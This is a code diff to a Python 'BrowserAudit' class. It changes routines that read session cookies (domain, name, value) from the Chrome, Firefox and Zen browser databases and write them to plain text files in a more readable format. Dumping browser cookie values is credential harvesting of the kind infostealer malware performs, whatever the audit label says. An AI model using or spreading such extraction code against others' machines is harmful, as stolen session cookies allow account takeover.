@@ -103,11 +103,14 @@ class BrowserAudit:
         try:
             conn = sqlite3.connect(path)
             cursor = conn.cursor()
-            cursor.execute("SELECT * FROM cookies LIMIT 50")
+            cursor.execute("SELECT host_key, name, value FROM cookies LIMIT 50")
 
             with open(self.cookies_dir / "chrome_cookies.txt", 'w') as f:
-                for row in cursor.fetchall():
-                    f.write(str(row) + '\n')
+                for host, name, value in cursor.fetchall():
+                    f.write(f"Domain: {host}\n")
+                    f.write(f"Name: {name}\n")
+                    f.write(f"Value: {value}\n")
+                    f.write("-" * 60 + "\n\n")
 
             conn.close()
             print(f"{self.COLORS['GREEN']}[OK] Chrome cookies extracted{self.COLORS['RESET']}\n")
@@ -130,11 +133,14 @@ class BrowserAudit:
                 if cookies_file.exists():
                     conn = sqlite3.connect(cookies_file)
                     cursor = conn.cursor()
-                    cursor.execute("SELECT * FROM moz_cookies LIMIT 50")
+                    cursor.execute("SELECT host, name, value FROM moz_cookies LIMIT 50")
 
                     with open(self.cookies_dir / "firefox_cookies.txt", 'w') as f:
-                        for row in cursor.fetchall():
-                            f.write(str(row) + '\n')
+                        for host, name, value in cursor.fetchall():
+                            f.write(f"Domain: {host}\n")
+                            f.write(f"Name: {name}\n")
+                            f.write(f"Value: {value}\n")
+                            f.write("-" * 60 + "\n\n")
 
                     conn.close()
 
@@ -161,11 +167,14 @@ class BrowserAudit:
                 if cookies_file.exists():
                     conn = sqlite3.connect(cookies_file)
                     cursor = conn.cursor()
-                    cursor.execute("SELECT * FROM moz_cookies LIMIT 50")
+                    cursor.execute("SELECT host, name, value FROM moz_cookies LIMIT 50")
 
                     with open(self.cookies_dir / "zen_cookies.txt", 'w') as f:
-                        for row in cursor.fetchall():
-                            f.write(str(row) + '\n')
+                        for host, name, value in cursor.fetchall():
+                            f.write(f"Domain: {host}\n")
+                            f.write(f"Name: {name}\n")
+                            f.write(f"Value: {value}\n")
+                            f.write("-" * 60 + "\n\n")
 
                     conn.close()
 
